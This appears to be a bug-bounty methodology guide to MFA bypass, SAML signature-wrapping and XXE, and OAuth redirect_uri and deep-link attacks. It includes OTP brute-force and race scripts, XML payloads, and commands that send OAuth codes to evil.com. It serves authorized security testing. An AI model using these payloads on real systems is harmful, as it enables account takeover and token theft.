4. If accepted → OTP is not invalidated after use

**Pattern 3 — Submit obviously wrong OTP, observe response:**
Try submitting `000000` or `123456`. If the response is 200 or returns a session token, OTP validation is broken or client-side only.

**Pattern 4 — Partial / incremental validation (prefix oracle):**
If a guessed full code is rejected, test whether the server validates the OTP **prefix-by-prefix** instead of all-or-nothing. Submit a short partial code and compare responses:
1. Submit a 1–3 digit value (e.g. `otp=1`, then `otp=12`, …) — for a POST verify endpoint the code goes in the **request body**, not the URL query string, or the server reads an empty value.
2. If a *correct* prefix gives a DIFFERENT response than a wrong one (a success/flag, a distinct message, or a different length/timing), the validator leaks correctness one chunk at a time.
3. Walk the code digit-by-digit: keep the prefix that "responds correct," append 0–9, repeat. This collapses 10^6 brute force to ~10×N guesses (≤60 for a 6-digit code) — very feasible in a bounded test.
This is the go-to when there is no leaked code and no skip/replay path. Some apps award success on *any* correct prefix outright (so a single correct first digit can win — sweep `otp=0,1,…,9` before giving up).
**CRITICAL — stay in ONE session:** re-authenticating (POST /…/login again) regenerates the OTP, throwing away your prefix progress. Do the entire sweep against a single established MFA session; never re-login between guesses.

**On full brute force:** brute-forcing all 10^6 codes is infeasible in a bounded test — but the prefix oracle above (Pattern 4) usually makes it unnecessary. Only attempt full brute force with evidence of no rate limit AND a small key space.

**Proof:** A session token or protected resource data in the response without completing MFA confirms the bypass.

---

## 19. MFA / 2FA BYPASS
> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.

### Pattern 1: No Rate Limit on OTP
```bash
# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
# -t 5 (slow down) — aggressive rates get 429 or ban
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
```

---

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Chain primitive: cookie theft (via XSS or session-fixation) + password oracle (login response timing/length diff reveals valid passwords without lockout) + no MFA step-up on password-change endpoint = persistent ATO without ever facing the OTP challenge → password rotated, attacker locks victim out.
- **`hunt-race-condition`** — Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used → 1 success + 19 "already-used" → race window confirmed → attacker doesn't need to brute, just guesses once and parallelizes → ATO.
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state → MFA never enforced because the route gate was misplaced.
- **`hunt-misc`** — Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) → attacker with any read-IDOR or XSS exfils backup codes → uses one backup code → MFA satisfied → ATO without OTP knowledge.
- **`security-arsenal`** — Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when "MFA satisfied" claim lives in a JWT claim that can be forged.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two.




---

## hunt-saml — Hunting Methodology (real BB reports)

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.



---

## hunt-oauth — Hunting Methodology (real BB reports)

## Crown Jewel Targets

OAuth vulnerabilities are among the highest-value bug classes in web security because they directly enable **account takeover, session theft, and authentication bypass** — the trifecta that programs pay most for.

**Highest-value targets:**
- **Consumer identity providers** (Google, Facebook, PayPal, Apple SSO integrations) — any compromise cascades across all relying parties
- **Mobile apps with custom deep link OAuth handlers** — Android/iOS intent handling is notoriously loose
- **Multi-tenant SaaS platforms** (GitLab, Reddit-scale apps) where one OAuth flaw hits millions of accounts
- **Gaming/entertainment platforms** with federated login (Rockstar, Oculus) — often security-immature teams
- **Enterprise SSO connectors** — critical infrastructure, high severity payouts

**Asset types that pay most:**
- OAuth authorization endpoints (`/oauth/authorize`, `/connect/authorize`)
- Token exchange endpoints (`/oauth/token`)
- Mobile deep link handlers (`push_notification_webview`, custom scheme URIs)
- Social login callback handlers (`/auth/callback`, `/oauth/callback`)

**Typical payouts:** $500–$20,000+ depending on program; account takeover findings often hit max bounty.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/oauth/authorize
/oauth/token
/connect/authorize
/auth/callback
/oauth/callback
/login?redirect_uri=
/signin?next=
/auth?return_to=
/oauth/redirect
/push_notification_webview
```

### Response Headers That Signal OAuth
```
Location: https://accounts.example.com/oauth/...
Set-Cookie: oauth_state=
WWW-Authenticate: Bearer
Content-Type: application/json (with access_token in body)
```

### JavaScript Patterns (grep in JS bundles)
```javascript
redirect_uri
client_id
response_type=code
response_type=token
state=
nonce=
oauth_token
access_token
push_notification_webview
deeplink
intent://
```

### Tech Stack Signals
- Android apps with `intent-filter` in `AndroidManifest.xml` handling `http://` or custom scheme URIs
- Apps using Doorkeeper, OmniAuth, Devise (Ruby), Passport.js (Node), Spring Security OAuth
- Social login buttons (Google, Facebook, Apple) = OAuth surface guaranteed
- `.well-known/openid-configuration` present = full OIDC surface available

---

## Step-by-Step Hunting Methodology

1. **Enumerate all OAuth entry points**
   - Spider the app for `/oauth`, `/connect`, `/auth`, `/login` paths
   - Check `.well-known/openid-configuration` and `.well-known/oauth-authorization-server`
   - Decompile mobile APKs: `apktool d app.apk` and grep for `redirect_uri`, `intent://`, deep link schemes

2. **Map the full OAuth flow**
   - Capture the authorization request: note `client_id`, `redirect_uri`, `state`, `nonce`, `response_type`
   - Capture the callback: note where tokens/codes land, what validates state/nonce

3. **Test `redirect_uri` validation (highest yield)**
   - Try exact host bypass: `redirect_uri=https://legit.com.evil.com`
   - Try path traversal: `redirect_uri=https://legit.com/callback/../../../evil`
   - Try open redirects on the legitimate domain first, then chain into OAuth
   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
   - Try encoded characters: `%2F`, `%40`, `%23` to confuse parsers

4. **Test `state` parameter (CSRF)**
   - Remove `state` entirely — does the flow complete?
   - Reuse a fixed `state` value across sessions
   - Check if `state` is validated server-side or only client-side

5. **Test `nonce` parameter (replay/bypass)**
   - Capture a nonce from one flow, attempt to replay it in another
   - Check if nonce is validated after token exchange
   - Test if nonce can be extracted via referrer leak (step 9)

6. **Test authentication step completeness**
   - For multi-step auth (e.g., email verification + OAuth): can you skip to `/oauth/token` directly?
   - Check if partial auth state (unverified email) is accepted by the token endpoint

7. **Hunt referrer leakage**
   - After OAuth callback with tokens in URL fragment or query, check if any on-page resources (images, scripts, iframes) receive the full `Referer` header
   - Look specifically at language switchers, analytics calls, social share buttons triggered post-auth

8. **Test mobile deep links**
   - For Android: craft malicious intent URIs that redirect the OAuth webview to attacker-controlled URLs
   - Check if deep link handlers validate the origin/host before loading
   - Test `push_notification_webview` patterns that accept arbitrary URLs

9. **Test misconfigured client credentials**
   - Check if `client_secret` appears in JS bundles or APK resources
   - Test if token endpoint accepts arbitrary `redirect_uri` values when combined with leaked `client_id`/`client_secret`

10. **Verify and document**
    - Confirm state is not validated → CSRF to account link
    - Confirm token lands on attacker domain → session theft
    - Confirm email verification skippable → auth bypass
    - Run Gate 0 check before reporting

---

## Payload & Detection Patterns

### redirect_uri Bypass Payloads
```
# Host confusion
https://evil.com#legit.com
https://legit.com.evil.com
https://legit.com@evil.com

# Path traversal
https://legit.com/oauth/callback/../../redirect?url=https://evil.com

# Open redirect chain (find open redirect on legit domain first)
https://legit.com/logout?next=https://evil.com

# Parameter pollution
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# URL encoded slashes
https://legit.com%2F@evil.com
https://legit.com%252F..%252F..evil.com
```

### State CSRF Test
```bash
# Step 1: Initiate OAuth flow, capture state value
# Step 2: Drop request, use attacker account's link with victim's session
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"

# Step 3: Force victim to visit callback with attacker's code + fixed state
https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
```

### Nonce Extraction via Referrer
```bash
# After OAuth callback landing page, check outbound requests
# Look for Referer header containing access_token or code
curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
  -H "Referer: https://evil.com" \
  --max-redirs 0

# Grep JS for outbound calls made on callback page
grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
```

### Mobile Deep Link Exploit (Android)
```bash
# ADB exploit for push_notification_webview deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"

# Craft intent URI for web-based exploit
<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
```

### Token Endpoint Auth Bypass
```bash
# Test unauthenticated token exchange (skip email verification)
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://legit.com/callback"

# Test with unverified account credentials
curl -X POST https://target.com/oauth/token \
  -d "grant_type=password" \
  -d "username=unverified@evil.com" \
  -d "password=password123" \
  -d "client_id=CLIENT_ID"
```

### Grep Patterns for Recon
```bash
# In APK/JS files
grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .
grep -r "intent://\|deeplink\|scheme://" .

# In Burp history
# Filter: URL contains "oauth" OR "token" OR "callback"
# Filter: Response contains "access_token" OR "code=" in Location header

# Check .well-known
curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
```

### OIDC Discovery & Dynamic Registration Abuse
```bash
# Enumerate OIDC endpoints (esp. registration_endpoint)
curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'

# If registration_endpoint is open, register a malicious client with attacker redirect_uri
curl -X POST https://idp/connect/register \
  -H "Content-Type: application/json" \
  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
```

### Cross-Client Token Confusion
```bash
# Mint token for client A, attempt replay on client B's API
TOKEN=$(curl -s https://idp/oauth/token \
  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)

# Test if client B's API accepts the token (no audience validation)
curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"
```

### OIDC prompt=none Silent Re-Auth Test
```bash
# Test whether adding prompt=none to authorize request yields a token without user interaction
# Signals session fixation / silent auth abuse potential
curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"
```

---

## Common Root Causes

1. **Weak `redirect_uri` validation** — developers whitelist by prefix (`startsWith`) rather than exact match, or whitelist an entire domain instead of specific paths. A sub-path open redirect on the same domain then becomes a full token theft primitive.

2. **Missing or unvalidated `state` parameter** — developers implement OAuth by following basic tutorials that omit CSRF protection, or validate state client-side only in JavaScript (easily bypassed).

3. **Nonce not validated post-exchange** — nonce is generated and sent in the request but never verified against the ID token after the code exchange, making replay attacks possible.

4. **Authentication step ordering not enforced server-side** — teams implement multi-step auth (signup → email verify → OAuth grant) but don't enforce the sequence server-side. The token endpoint doesn't check completion of prerequisite steps.

5. **Token/code in URL with outbound requests on callback page** — developers land users on a callback page with tokens in the query string, then that page fires analytics, social share, or CDN requests that leak the full URL via `Referer` header.

6. **Mobile deep link handlers trust all input URLs** — Android/iOS developers build webview wrappers for push notification flows without validating that the loaded URL belongs to their own domain.

7. **Misconfigured OAuth application registration** — developers register wildcard redirect URIs (`https://*.example.com/*`) or don't restrict them at all during development and forget to lock down for production.

8. **Client secrets embedded in mobile apps** — treating confidential client credentials as public, enabling an attacker with the secret to perform token requests with arbitrary redirect URIs.

9. **OIDC `sub` claim ambiguity across identity providers** — apps accepting login from multiple IdPs (Google, Microsoft, Apple) may key accounts on `sub` alone without IdP isolation. If two IdPs emit the same `sub` for different users, one IdP's attacker hijacks accounts linked to the other IdP.

---

## Bypass Techniques

### Defender: Exact-match `redirect_uri` whitelist
**Bypass:** Find an open redirect on the whitelisted domain itself, then use that URL as the redirect_uri. The OAuth server validates the registered domain ✓, but the open redirect bounces the code/token to attacker.
```
redirect_uri=https://legit.com/logout?next=https://evil.com
```

### Defender: `state` parameter required
**Bypass:** Check if state is validated for *length/format* but not *binding to session*. Use a fixed predictable state value. Also check if PKCE is enforced — if not, the state check alone is insufficient for code injection.

### Defender: Fragment-only token delivery (`response_type=token`)
**Bypass:** Fragment isn't sent in `Referer` by browsers, but JavaScript on the callback page may read `window.location.hash` and pass it to analytics or postMessage to a parent frame. Intercept postMessage handlers.

### Defender: Host validation on mobile deep links
**Bypass:** Try URL encoding (`https%3A//evil.com`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.

### Defender: Short-lived authorization codes
**Bypass:** Referrer leakage and open redirects work even with short-lived codes if the attacker has a fast receiver. For CSRF, the victim completes the flow so timing is less critical.

### Defender: PKCE enforcement
**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.

### Defender: Nonce validation
**Bypass:** Check if nonce is validated client-side in JavaScript only. Intercept and modify the ID token's nonce claim if the signature isn't verified (rare but seen in misconfigured implementations). Also test if nonce is validated on *initial* request but not on token refresh.

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Be specific: "I can send victim a crafted URL → victim clicks → their OAuth code redirects to my server → I exchange code for access token → I am now logged in as victim." If you can't complete this full chain, it may be informational only.

**2. What does the victim LOSE?**
Minimum bar: victim loses authenticated session (account access). Higher bars: victim loses linked accounts, payment methods, private data. If the attacker only learns the victim's identity without gaining access, severity drops significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Open a fresh browser/device with no prior state. If you can walk from "unauthenticated" to "authenticated as victim" in 10 minutes using only your written steps, the bug is real and reportable. If it requires lucky timing, specific victim behavior beyond "click a link," or network position, document those dependencies explicitly.

---

## Real Impact Examples

### Scenario 1: Mobile Session Theft via Push Notification Deep Link (PayPal/Venmo pattern)
An attacker discovers that the Android app's push notification handler accepts an arbitrary `url` parameter in its deep link scheme without validating the host. The attacker crafts a malicious URL using the app's custom scheme pointing to their own server. When sent to a victim (via social engineering or a compromised push notification channel), the app opens a WebView navigating to the attacker's server — which then initiates an OAuth flow and captures the OAuth token as it's returned to the "callback" now under attacker control. Result: full account takeover on a payments platform affecting millions of users. Business impact: unauthorized fund transfers, exposure of linked payment methods and transaction history.

### Scenario 2: Email Verification Bypass via Direct Token Endpoint Access (GitLab pattern)
A developer creates an account with an unverified email address. Normally the platform blocks full access until email is verified. However, the `/oauth/token` endpoint performs no verification status check — it only validates credentials. The attacker calls `/oauth/token` directly with valid (unverified) credentials and receives a fully-scoped OAuth token. This token passes all downstream authorization checks. Result: complete authentication bypass, allowing unverified/disposable email accounts to gain full platform access, undermining the email verification security control entirely. At scale on a platform like GitLab, this affects CI/CD pipeline access, repository access, and API usage.

### Scenario 3: OAuth Token Theft via Referrer Header on Language Change (Rockstar Games pattern)
The OAuth callback page for Facebook login lands users at a URL containing the `access_token` in the query string. The page includes a language-switcher widget that makes a GET request to change locale preferences. This GET request includes the full page URL as a `Referer` header — containing the Facebook access token. An attacker who can read server logs (or who compromises the language-change endpoint, or who is a malicious advertiser with pixel access) harvests Facebook OAuth tokens from Referer logs. Result: the attacker can authenticate to the victim's Facebook account and any other service accepting that Facebook token, constituting a cross-platform account takeover. Business impact: GDPR/privacy violation, cross-service account compromise, potential regulatory liability.

---

## Disclosed Report Citations (Backfill +9 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 10 internal references. Each is a distinct OAuth subclass with a working PoC documented in the cited writeup.

11. **Semrush — IDN-homograph redirect_uri bypass** ([H1 #861940](https://hackerone.com/reports/861940))
    - Subclass: `redirect_uri` bypass via Unicode-confusable host (homograph)
    - Payload: `redirect_uri=https://oauth.šemrush.com/cb` (punycode `xn--emrush-9jb.com`) — passed Latin-only string check on validator
    - Root cause: server validates `redirect_uri` host as ASCII-string equality but does not normalize Unicode → confusables → punycode before compare
    - Disclosure: 2020, public bounty (amount not disclosed); discoverer Yassine Aboukir

12. **Bohemia Interactive — redirect_uri filter bypass (BiStudio)** ([H1 #405100](https://hackerone.com/reports/405100))
    - Subclass: `redirect_uri` validation bypass → OAuth token exfiltration
    - Payload: redirect_uri crafted to defeat the regex/prefix filter and land tokens on attacker host; reporter chained the bypass to a full token-leak PoC
    - Root cause: weak redirect_uri filter that accepted attacker-controlled host while still matching the intended pattern
    - Year: 2018-disclosed; remains a canonical example of regex-redirect_uri-bypass cited in subsequent reports

13. **pixiv — path-traversal in OAuth `redirect_uri`** ([H1 #1861974](https://hackerone.com/reports/1861974))
    - Subclass: path-traversal `redirect_uri` bypass → authorization-code leakage
    - Payload: `redirect_uri=https://legit.pixiv.host/legit/../../attacker/cb` — server normalized after validation
    - Root cause: validator inspected raw string; downstream HTTP/browser handled `../` traversal and emitted code to attacker path
    - Disclosure: 2023, **$2,000 bounty**, 244 upvotes — confirmed paid

14. **Slack — OAuth2 redirect_uri bypass (domain-suffix)** ([H1 #2575](https://hackerone.com/reports/2575))
    - Subclass: `redirect_uri` validation bypass via domain-suffix / subdomain confusion
    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.com`) defeated the suffix-only check
    - Root cause: `endsWith()` / suffix-match instead of strict host equality
    - Disclosure: 2013 (foundational case still cited in modern OAuth training material) — Slack public bounty

15. **Booking.com (Facebook social-login)** ([Salt Labs writeup](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com))
    - Subclass: three-step chain — open-redirect on whitelisted domain + redirect_uri bypass + `response_type` swap → Facebook OAuth code/token theft → ATO
    - Payload: authorize URL with `redirect_uri=https://account.booking.com/<open-redirect>?next=https://attacker.tld/cb` and `response_type` toggled to leak tokens via fragment
    - Root cause: validator trusted any path under `account.booking.com`; open redirect on that host bounced the auth code to attacker
    - Disclosure: March 2023 — coordinated disclosure, no public bounty figure (~500M MAU exposure)

16. **Expo.io (`expo-auth-session`) — CVE-2023-28131** ([Salt Labs writeup](https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services))
    - Subclass: scope-creep / unvalidated `returnUrl` parameter → cross-app OAuth-code theft (impacts every consumer of expo-auth-session social login)
    - Payload: attacker passes `returnUrl=https://attacker.tld` to the OAuth proxy → Expo blindly forwards Facebook/Google/Apple/Twitter code to attacker
    - Root cause: framework-level OAuth proxy did not validate `returnUrl` host before forwarding the social-IdP callback
    - Disclosure: May 2023; CVSS 9.6; fixed Feb 2023 hotfix + deprecated by Feb 26 2023

17. **Microsoft Azure AD multi-tenant — "nOAuth"** ([Descope writeup](https://www.descope.com/blog/post/noauth))
    - Subclass: cross-IdP account-takeover via unverified, mutable `email` claim ("Pass-The-Token" equivalent)
    - Payload: attacker sets Azure AD admin profile `mail` attribute to victim's address → clicks "Log in with Microsoft" on relying party that keys users by email claim → instant ATO
    - Root cause: Microsoft `email` claim is mutable + unverified; RPs treated it as primary identifier
    - Disclosure: April 11 2023 reported, fixed June 20 2023 (mitigations + new `xms_edov` claim)

18. **Grammarly / Vidio / Bukalapak — "Pass-The-Token" social-login** ([Salt Labs writeup](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts))
    - Subclass: missing audience / `aud` validation on Facebook access_token → cross-client token replay → ATO
    - Payload: attacker obtains Facebook token issued for `attacker.app` → replays the token to Grammarly/Vidio/Bukalapak login API → server fetches FB user via `/me`, finds victim's email, issues victim session
    - Root cause: relying party calls Facebook `/me` with attacker-issued token but never validates the token's `app_id` belongs to the RP
    - Disclosure: October 2023 — coordinated, ~1B account exposure across the three sites

19. **Zoom — OAuth "dirty dancing" chained ATO** ([Harel Security writeup](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html))
    - Subclass: `response_type=token` swap + lax `postMessage` origin check + cookie-tossing → authorization-code leak via web_message response mode → ATO + cam/mic hijack
    - Payload: attacker page opens Zoom OAuth with `response_type=code&response_mode=web_message`, intercepts the resulting `postMessage` because window listener accepts any `*.zoom.us` origin → exchanges code for session
    - Root cause: combination of weak postMessage origin check, missing CSRF binding on `state`, and `response_mode=web_message` returning code to a parent window without exact-origin enforcement
    - Disclosure: reported Oct 2023, fixed Jan 2024, **$15,000 bounty** (Sudi / BrunoZero / H4R3L)

20. **Detectify Labs — "Dirty Dancing" multi-vendor OAuth token leakage** ([Detectify writeup, F. Rosén](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/))
    - Subclass: response-type switching + invalid-state quirks + 3rd-party JS gadget chains → OAuth code/token leakage with NO XSS required
    - Payload: attacker forces `response_type=token` on an endpoint that only validated `code`; combines with promiscuous postMessage listeners and URL-storage gadgets on the callback page to siphon tokens via cross-origin reads
    - Root cause: OAuth server tolerates response_type downgrade/swap; callback page leaks `window.location` via permissive postMessage receivers
    - Disclosure: July 2022 — multi-vendor (Apple, Microsoft, Slack et al.); PortSwigger Top 10 Web Hacks 2022 #1

---

## Browser-parse vs server-parse — redirect_uri prefix-match bypass shapes

A server-side prefix-match flaw on `redirect_uri` is **necessary but not sufficient** to land the OAuth code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another. They behave differently. Always confirm both before writing the finding as a chain → ATO.

| Server `redirect_uri` validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
|---|---|---|---|---|
| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension — the `.evil.com` extends the host) | **YES** |
| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.com/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.com/cb` and stays on acme.example | usually **NO** |

